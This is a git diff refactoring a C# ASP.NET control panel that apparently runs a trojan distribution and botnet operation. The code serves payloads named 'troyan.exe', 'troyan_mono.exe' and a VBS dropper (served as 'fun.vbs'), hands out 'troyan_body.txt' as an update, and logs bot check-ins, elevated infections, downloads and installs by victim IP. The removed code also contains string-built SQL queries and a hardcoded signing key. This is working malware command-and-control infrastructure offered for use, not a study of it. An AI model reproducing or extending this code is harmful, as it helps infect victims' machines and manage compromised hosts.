@@ -1,231 +1,31 @@
-﻿using System.Data;
-using System.Security.Cryptography;
-using System.Text;
-using System.Text.Json;
-using System.Text.Json.Serialization;
-using cp.Code;
+﻿using System.Text;
 using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.Mvc;
-using Microsoft.Data.SqlClient;
 using Microsoft.Extensions.Caching.Memory;
 using model;
 
 namespace cp.Controllers;
 
 [Route("")]
-public class CpController : Controller
+public class CpController : BaseController
 {
-    private static string RootDataDir => ServerModelLoader.RootDataStatic;
-
-    private const string SecretKey = "YourSecretKeyHere"; // Secret key for hashing
-    
-    private readonly string _connectionString;
-
-
-
-    public static Dictionary<string, string> AdminServers()
+    private readonly IServiceProvider _serviceProvider;
+    private readonly BotController _botController;
+    public CpController(ServerService serverService, BotController botController, IServiceProvider serviceProvider, IConfiguration configuration, IMemoryCache memoryCache): base(serverService, configuration, memoryCache)
     {
-        var result = new Dictionary<string, string>();
-        var dirs = Directory.GetDirectories(RootDataDir).ToArray();
-        foreach (var dir in dirs)
-        {
-            var password = "password";
-            result.Add(dir, Path.GetFileName(dir));
-        }
-        return result;
+        _serviceProvider = serviceProvider;
+        _botController = botController;
     }
     
-    private readonly ServerService _serverService;
-
-    private readonly IMemoryCache _memoryCache;
-    
-    public CpController(ServerService serverService,IConfiguration configuration, IMemoryCache memoryCache)
-    {
-        _serverService = serverService;
-        _connectionString = configuration.GetConnectionString("Default");
-        _memoryCache = memoryCache;
-    }
-    
-    private string Server(string server)
-    {
-        if (Request.Host.Host == "localhost")
-            return ServerModelLoader.ipFromHost(ServerModelLoader.DomainControllerStatic);
-        if (!string.IsNullOrEmpty(server))
-            return ServerModelLoader.ipFromHost(server);
-        return ServerModelLoader.ipFromHost(Request.Host.Host);
-    }
-    
-    [HttpGet("{server}/Stats")]
-    public async Task<IActionResult> ViewStats(string server)
-    {
-        server = Server(server);
-        var stats = new List<DailyServerSerieStats>();
-
-        try
-        {
-            using (var connection = new SqlConnection(_connectionString))
-            {
-                await connection.OpenAsync();
-                using (var command = new SqlCommand($"SELECT TOP (1000) [Date], [server], [Serie], [UniqueIDCount], [ElevatedUniqueIDCount],NumberOfDownloads,InstallCount,UnInstallCount FROM [hephaestus].[dbo].[DailyServerSerieStatsView] where server = '{server}' order by date desc", connection))
-                {
-                    using (var reader = await command.ExecuteReaderAsync())
-                    {
-                        while (await reader.ReadAsync())
-                        {
-                            var stat = new DailyServerSerieStats
-                            {
-                                Date = reader.GetDateTime(reader.GetOrdinal("Date")),
-                                Server = reader.GetString(reader.GetOrdinal("server")),
-                                Serie = reader.GetString(reader.GetOrdinal("Serie")),
-                                UniqueIDCount = reader.GetInt32(reader.GetOrdinal("UniqueIDCount")),
-                                ElevatedUniqueIDCount = reader.GetInt32(reader.GetOrdinal("ElevatedUniqueIDCount")),
-                                NumberOfDownloads = reader.GetInt32(reader.GetOrdinal("NumberOfDownloads")),
-                                InstallCount = reader.GetInt32(reader.GetOrdinal("InstallCount")),
-                                UnInstallCount = reader.GetInt32(reader.GetOrdinal("UnInstallCount"))
-                            };
-                            stats.Add(stat);
-                        }
-                    }
-                }
-            }
-        }
-        catch (Exception ex)
-        {
-            // Log the exception (ex) here
-            return StatusCode(500, $"Internal server error: {ex.Message}");
-        }
-
-        return View("Stats", stats);
-    }
-    
-    [Authorize(Policy = "AllowFromIpRange")]
-    [HttpGet("{server}/BotLog")]
-    public async Task<IActionResult> BotLog(string server)
-    {
-        server = Server(server);
-        var stats = new List<BotLog>();
-
-        try
-        {
-            using (var connection = new SqlConnection(_connectionString))
-            {
-                await connection.OpenAsync();
-                using (var command = new SqlCommand($@"SELECT TOP (1000) [id]
-      ,[server]
-      ,[first_seen]
-      ,[last_seen]
-      ,[first_seen_ip]
-      ,[last_seen_ip]
-      ,[serie]
-      ,[number]
-      ,[number_of_requests]
-      ,[number_of_elevated_requests]
-      ,[number_of_downloads]
-  FROM [hephaestus].[dbo].[BotLogView]
-  where server='{server}' order by last_seen desc", connection))
-                {
-                    using (var reader = await command.ExecuteReaderAsync())
-                    {
-                        while (await reader.ReadAsync())
-                        {
-                            var stat = new BotLog()
-                            {
-                                Id = reader.GetString("id"),
-                                Server = reader.GetString(reader.GetOrdinal("server")),
-                                LastSeen = reader.GetDateTime(reader.GetOrdinal("last_seen")),
-                                LastSeenIp = reader.GetString(reader.GetOrdinal("last_seen_ip")),
-                                FirstSeen = reader.GetDateTime(reader.GetOrdinal("first_seen")),
-                                FirstSeenIp = reader.GetString(reader.GetOrdinal("first_seen_ip")),
-                                Serie = reader.GetString("serie"),
-                                Number = reader.GetString("number"),
-                                NumberOfRequests =  reader.GetOrdinal("number_of_requests"),
-                                NumberOfElevatedRequests =  reader.GetInt32("number_of_elevated_requests"),
-                                NumberOfDownloads =  reader.GetInt32("number_of_downloads")
-                            };
-                            stats.Add(stat);
-                        }
-                    }
-                }
-            }
-        }
-        catch (Exception ex)
-        {
-            // Log the exception (ex) here
-            return StatusCode(500, $"Internal server error: {ex.Message}");
-        }
-
-        return View("BotLog", stats);
-    }
-    
-    
-    [Authorize(Policy = "AllowFromIpRange")]
-    [HttpGet("{server}/DownloadLog")]
-    public async Task<IActionResult> DownloadLog(string server)
-    {
-        server = Server(server);
-        var stats = new List<DownloadLog>();
-
-        try
-        {
-            using (var connection = new SqlConnection(_connectionString))
-            {
-                await connection.OpenAsync();
-                using (var command = new SqlCommand($@"SELECT TOP (1000) 
-        [ip]
-      ,[server]
-      ,[profile]
-      ,[first_seen]
-      ,[last_seen]
-      ,[number_of_requests]
-  FROM [hephaestus].[dbo].[DownloadLogView]
-  where server='{server}' order by last_seen desc", connection))
-                {
-                    using (var reader = await command.ExecuteReaderAsync())
-                    {
-                        while (await reader.ReadAsync())
-                        {
-                            var stat = new DownloadLog()
-                            {
-                                Ip = reader.GetString("ip"),
-                                Server = reader.GetString(reader.GetOrdinal("server")),
-                                Profile = reader.GetString(reader.GetOrdinal("profile")),
-                                FirstSeen = reader.GetDateTime(reader.GetOrdinal("first_seen")),
-                                LastSeen = reader.GetDateTime(reader.GetOrdinal("last_seen")),
-                                NumberOfRequests =  reader.GetOrdinal("number_of_requests"),
-                            };
-                            stats.Add(stat);
-                        }
-                    }
-                }
-            }
-        }
-        catch (Exception ex)
-        {
-            // Log the exception (ex) here
-            return StatusCode(500, $"Internal server error: {ex.Message}");
-        }
-
-        return View("DownloadLog", stats);
-    }
-    
-    
-    [Authorize(Policy = "AllowFromIpRange")]
-    public IActionResult Index()
-    {
-        var server = Server("");
-        return IndexWithServer(server);
-    }
-
     [Authorize(Policy = "AllowFromIpRange")]
     [HttpGet]
-    [Route("{server}")]
-    public IActionResult IndexWithServer(string server)
+    public IActionResult Index()
     {
+        var server = Server;
         if (server == "favicon.ico")
             return NotFound();
         try
         {
-            server = Server(server);
             var serverResult = _serverService.GetServer(server, false);
             return View("Index", serverResult.ServerModel);
         }
@@ -235,12 +35,12 @@ public class CpController : Controller
         }
     }
     
-    [HttpGet("{server}/GetIcon")]
-    public IActionResult GetIcon(string server)
+    [HttpGet("/GetIcon")]
+    public IActionResult GetIcon()
     {
         try
         {
-            server = Server(server);
+            var server = Server;
             if (!System.IO.File.Exists(_serverService.GetIcon(server)))
                 return NotFound();
             var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetIcon(server));
@@ -269,26 +69,26 @@ public class CpController : Controller
         }
     }
 
-    [HttpGet("{server}/GetExe")]
-    public IActionResult GetExe(string server)
+    [HttpGet("/GetExe")]
+    public IActionResult GetExe()
     {
-        return GetFile(_serverService.GetExe(server), "troyan.exe");
+        return GetFile(_serverService.GetExe(Server), "troyan.exe");
     }
     
-    [HttpGet("{server}/GetExeMono")]
-    public IActionResult GetExeMono(string server)
+    [HttpGet("/GetExeMono")]
+    public IActionResult GetExeMono()
     {
-        return GetFile(_serverService.GetExeMono(server), "troyan_mono.exe");
+        return GetFile(_serverService.GetExeMono(Server), "troyan_mono.exe");
     }
     
-    protected async Task<IActionResult> GetFileAdvanced(string server, string file, string name, string random, string target, string randomMethod, string nofile)
+    private async Task<IActionResult> GetFileAdvanced(string file, string name, string random, string target, string randomMethod, string nofile)
     {
         try
         {
             string fileContent;
             if (!_memoryCache.TryGetValue(file, out fileContent))
             {
-                fileContent = await VbsRandomer.ReadFileWithRetryAsync($@"C:\data\{server}\{file}", 2, 50);
+                fileContent = await VbsRandomer.ReadFileWithRetryAsync($@"C:\data\{Server}\{file}", 2, 50);
                 var cacheEntryOptions = new MemoryCacheEntryOptions()
                     .SetSlidingExpiration(TimeSpan.FromMinutes(1));
                 _memoryCache.Set(file, fileContent, cacheEntryOptions);
@@ -307,90 +107,32 @@ public class CpController : Controller
         }
     }
     
-    [HttpGet("{server}/{profile}/{random}/{target}/DnLog")]
-    public async Task<IActionResult> DnLog(string server, string profile, string random, string target)
+    [HttpGet("/{profile}/{random}/{target}/GetVbs")]
+    public async Task<IActionResult> GetVbs(string profile, string random, string target)
     {
-        var ipAddress = GetIp();
+        var ipAddress = IpAddress;
         if (string.IsNullOrWhiteSpace(ipAddress))
             return BadRequest("IP address not found.");
-        if (string.IsNullOrWhiteSpace(server))
+        if (string.IsNullOrWhiteSpace(Server))
             return BadRequest("Server address not found.");
         
-        await DnLog(server, profile, ipAddress);
-
-        return Ok();
+        return await GetFileAdvanced("troyan.c.vbs", "fun.vbs", random, target, "vbs", "");
     }
-    
-    [HttpGet("{server}/{profile}/{random}/{target}/GetVbs")]
-    public async Task<IActionResult> GetVbs(string server, string profile, string random, string target)
-    {
-        var ipAddress = GetIp();
-        if (string.IsNullOrWhiteSpace(ipAddress))
-            return BadRequest("IP address not found.");
-        if (string.IsNullOrWhiteSpace(server))
-            return BadRequest("Server address not found.");
         
-        await DnLog(server, profile, ipAddress);
-        
-        return await GetFileAdvanced(server, "troyan.c.vbs", "fun.vbs", random, target, "vbs", "");
+    [HttpGet("/{profile}/GetVbsPhp")]
+    public async Task<IActionResult> GetVbsPhp(string profile)
+    {
+        return await GetFileAdvanced("dn.php", "dn.php", "", "", "","nofile");
     }
     
-        
-    [HttpGet("{server}/{profile}/GetVbsPhp")]
-    public async Task<IActionResult> GetVbsPhp(string server, string profile)
-    {
-        return await GetFileAdvanced(server, "dn.php", "dn.php", "", "", "","nofile");
-    }
-
-    protected async Task DnLog(string server, string profile, string ipAddress)
-    {
-        using (var connection = new SqlConnection(_connectionString))
-        {
-            await connection.OpenAsync();
-
-            using (var command = new SqlCommand("dbo.LogDn", connection))
-            {
-                command.CommandType = CommandType.StoredProcedure;
-
-                command.Parameters.AddWithValue("@server", server ?? (object)DBNull.Value);
-                command.Parameters.AddWithValue("@profile", profile ?? (object)DBNull.Value);
-                command.Parameters.AddWithValue("@ip", ipAddress);
-
-                await command.ExecuteNonQueryAsync();
-            }
-        }
-    }
-    
-    protected void ClearStats()
-    {
-        using (var connection = new SqlConnection(_connectionString))
-        {
-            connection.Open();
-
-            var command = new SqlCommand( "truncate table dbo.botLog; truncate table dbo.dnLog");
-            
-                command.CommandType = CommandType.Text;
-
-                command.Connection = connection;
-
-                command.ExecuteNonQuery();
-        }
-    }
-    
+    [HttpPost]
     [Authorize(Policy = "AllowFromIpRange")]
-    [HttpPost()]
-    public IActionResult Index(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
-    {
-        return IndexWithServer(updatedModel, action, iconFile, newEmbeddings, newFront);
-    }
-
-    [Authorize(Policy = "AllowFromIpRange")]
-    [HttpPost("{server}", Name = "Index")]
     public IActionResult IndexWithServer(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
     {
+        var server = Server;
         try
         {
-            var existingModel = _serverService.GetServer(updatedModel.Server, true).ServerModel;
+            var existingModel = _serverService.GetServer(server, true).ServerModel;
             if (existingModel == null)
             {
                 return NotFound();
@@ -399,12 +141,12 @@ public class CpController : Controller
             if (action == "reboot")
             {
                 var res = _serverService.Reboot();
-                return View("Index", new ServerModel() { Server = updatedModel.Server, Result = res });
+                return View("Index", new ServerModel() { Server = server, Result = res });
             }
             
             if (action == "clearstats")
             {
-                ClearStats();
+                _serviceProvider.GetRequiredService<StatsController>().ClearStats();
                 return View("Index", existingModel);
             }
 
@@ -413,9 +155,9 @@ public class CpController : Controller
             {
                 foreach (var file in newEmbeddings)
                 {
-                    var filePath = _serverService.GetEmbedding(updatedModel.Server, file.FileName);
-                    if (!Directory.Exists(_serverService.EmbeddingsDir(updatedModel.Server)))
-                        Directory.CreateDirectory(_serverService.EmbeddingsDir(updatedModel.Server));
+                    var filePath = _serverService.GetEmbedding(server, file.FileName);
+                    if (!Directory.Exists(_serverService.EmbeddingsDir(server)))
+                        Directory.CreateDirectory(_serverService.EmbeddingsDir(server));
                     using (var stream = new FileStream(filePath, FileMode.Create))
                     {
                         file.CopyTo(stream);
@@ -427,16 +169,16 @@ public class CpController : Controller
 
             var toDeleteEmbeddings = existingModel.Embeddings.Where(a => !updatedModel.Embeddings.Contains(a));
             foreach (var file in toDeleteEmbeddings)
-                _serverService.DeleteEmbedding(updatedModel.Server, file);
+                _serverService.DeleteEmbedding(server, file);
 
             //front
             if (newFront != null && newFront.Count > 0)
             {
                 foreach (var file in newFront)
                 {
-                    var filePath = _serverService.GetFront(updatedModel.Server, file.FileName);
-                    if (!Directory.Exists(_serverService.FrontDir(updatedModel.Server)))
-                        Directory.CreateDirectory(_serverService.FrontDir(updatedModel.Server));
+                    var filePath = _serverService.GetFront(server, file.FileName);
+                    if (!Directory.Exists(_serverService.FrontDir(server)))
+                        Directory.CreateDirectory(_serverService.FrontDir(server));
                     using (var stream = new FileStream(filePath, FileMode.Create))
                     {
                         file.CopyTo(stream);
@@ -448,12 +190,12 @@ public class CpController : Controller
 
             var toDeleteFront = existingModel.Front.Where(a => !updatedModel.Front.Contains(a));
             foreach (var file in toDeleteFront)
-                _serverService.DeleteFront(updatedModel.Server, file);
+                _serverService.DeleteFront(server, file);
 
             //icon
             if (iconFile != null && iconFile.Length > 0)
             {
-                var filePath = _serverService.GetIcon(updatedModel.Server);
+                var filePath = _serverService.GetIcon(server);
 
                 using (var stream = new FileStream(filePath, FileMode.Create))
                 {
@@ -480,7 +222,7 @@ public class CpController : Controller
                 .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();
 
             //model
-            existingModel.Server = updatedModel.Server;
+            existingModel.Server = server;
             existingModel.Alias = updatedModel.Alias;
             existingModel.StrahServer = updatedModel.StrahServer;
             existingModel.Login = updatedModel.Login;
@@ -513,18 +255,18 @@ public class CpController : Controller
             
             if (!ContainsUniqueValues(existingModel.Domains))
             {
-                return View("Index", new ServerModel() {Server = updatedModel.Server, Result = "Домены должны быть уникальными" });
+                return View("Index", new ServerModel() {Server = server, Result = "Домены должны быть уникальными" });
             }
 
             //service
-            var result = _serverService.PostServer(existingModel.Server, existingModel, action, "kill");
+            var result = _serverService.PostServer(server, existingModel, action, "kill");
 
             existingModel.Result = result;
             return View("Index", existingModel);
         }
         catch (Exception e)
         {
-            return View("Index", new ServerModel() {Server = updatedModel.Server, Result = e.Message + "\r\n" + e.StackTrace });
+            return View("Index", new ServerModel() {Server = server, Result = e.Message + "\r\n" + e.StackTrace });
         }
     }
 
@@ -543,163 +285,25 @@ public class CpController : Controller
         return true;
     }
 
-    
-    [Authorize(Policy = "AllowFromIpRange")]
-    [HttpGet] [Route("/admin")]
-    public IActionResult IndexAdmin()
+    #region BOT
+    [HttpGet("/{profile}/{random}/{target}/DnLog")]
+    public async Task<IActionResult> DnLog(string profile, string random, string target)
     {
-        return View("admin", new ServerModel(){AdminServers = AdminServers()});
-    }
-
-    [Authorize(Policy = "AllowFromIpRange")]
-    [HttpPost] [Route("/admin")]
-    private IActionResult IndexAdmin(ServerModel updatedModel)
-    {
-        if (updatedModel.AdminPassword != System.Environment.GetEnvironmentVariable("SuperPassword", EnvironmentVariableTarget.Machine))
-        {
-            return Unauthorized();
-        }
-
-        var was = AdminServers();
-
-        var toDelete = was.Where(a => !updatedModel.AdminServers.ContainsKey(a.Key));
-        
-        var toAdd = updatedModel.AdminServers.Where(a => !was.ContainsKey(a.Key));
-
-
-        
-        foreach (var server in toDelete)
-        {
-            ServerUtils.DeleteFolderRecursive(server.Key);
-        }
-        
-        foreach (var server in toAdd)
-        {
-            _serverService.GetServer(server.Key, false, true, server.Value);
-        }
-        
-        return IndexAdmin();
-    }
-
-    protected string GetIp()
-    {
-        string ipAddress = "unknown";
-        try
-        {
-            ipAddress = HttpContext.Connection.RemoteIpAddress?.ToString();
-        }
-        catch (Exception e)
-        {
-            ipAddress = "unknown";
-        }
-
-        if (Request.Headers.TryGetValue("HTTP_X_FORWARDED_FOR", out Microsoft.Extensions.Primitives.StringValues value))
-        {
-            var forwardedFor = value.First();
-
-            ipAddress = string.IsNullOrWhiteSpace(forwardedFor)
-                ? ipAddress
-                : forwardedFor.Split(',').Select(s => s.Trim()).FirstOrDefault();
-        }
-
-        return ipAddress;
+        return await _botController.DnLog(profile, random, target);
     }
     
     [HttpPost("/upsert")]
     [Consumes("application/json")]
     [Produces("application/json")]
-    public async Task<IActionResult> UpsertBotLog(
-        [FromHeader(Name = "X-Signature")] string xSignature,
-        [FromBody] BotLogRequest request)
+    public async Task<IActionResult> UpsertBotLog([FromHeader(Name = "X-Signature")] string xSignature, [FromBody] BotLogRequest request)
     {
-        var server = BackSvc.GetServer(Request.Host);
-        return await UpsertBotLog(server, xSignature, request);
-    }
-    
-    private static JsonSerializerOptions JsonOptions = new JsonSerializerOptions
-    {
-        DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
-        PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
-        WriteIndented = false // Ensure compact JSON
-    };
-   
-    
-    [HttpPost("{server}/upsert")]
-    [Consumes("application/json")]
-    [Produces("application/json")]
-    public async Task<IActionResult> UpsertBotLog(
-        string server,
-        [FromHeader(Name = "X-Signature")] string xSignature,
-        [FromBody] BotLogRequest request)
-    {
-        var ipAddress = GetIp();
-        if (string.IsNullOrWhiteSpace(ipAddress))
-            return BadRequest("IP address not found.");
-        if (string.IsNullOrWhiteSpace(server))
-            return BadRequest("Server address not found.");
-        
-        // Serialize the request object to JSON
-      
-
-        string jsonBody = JsonSerializer.Serialize(request, JsonOptions);
-
-       if (!ValidateHash(jsonBody, xSignature, SecretKey))
-        {
-            return Unauthorized("Invalid signature.");
-        }
-
-        try
-        {
-            using (var connection = new SqlConnection(_connectionString))
-            {
-                await connection.OpenAsync();
-
-                using (var command = new SqlCommand("dbo.UpsertBotLog", connection))
-                {
-                    command.CommandType = CommandType.StoredProcedure;
-
-                    command.Parameters.AddWithValue("@server", server ?? (object)DBNull.Value);
-                    command.Parameters.AddWithValue("@ip", ipAddress);
-                    command.Parameters.AddWithValue("@id", request.Id);
-                    command.Parameters.AddWithValue("@elevated", request.ElevatedNumber);
-                    command.Parameters.AddWithValue("@serie", request.Serie ?? (object)DBNull.Value);
-                    command.Parameters.AddWithValue("@number", request.Number ?? (object)DBNull.Value);
-
-                    await command.ExecuteNonQueryAsync();
-                }
-            }
-
-            return Ok("{}");
-        }
-        catch (Exception ex)
-        {
-            // Log the exception (ex) here
-            return StatusCode(500, $"Internal server error: {ex.Message}");
-        }
+        return await _botController.UpsertBotLog(xSignature, request);
     }
 
-    private static bool ValidateHash(string data, string hash, string key)
-    {
-        using (var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(key)))
-        {
-            var computedHash = Convert.ToBase64String(hmac.ComputeHash(Encoding.UTF8.GetBytes(data)));
-            // Debugging: Print the computed hash
-            Console.WriteLine($"Computed hash on server: {computedHash}");
-            return computedHash.Equals(hash);
-        }
-    }
-    
     [HttpGet("/update")]
     public IActionResult Update()
     {
-        var server = BackSvc.GetServer(Request.Host);
-        return Update(server);
+        return _botController.Update();
     }
-   
-    [HttpGet("{server}/update")]
-    public IActionResult Update(string server)
-    {
-        var fileBytes = System.IO.File.ReadAllBytes($@"C:\data\{server}\troyan_body.txt");
-        return File(fileBytes, "text/plain");
-    }
+    #endregion
 }
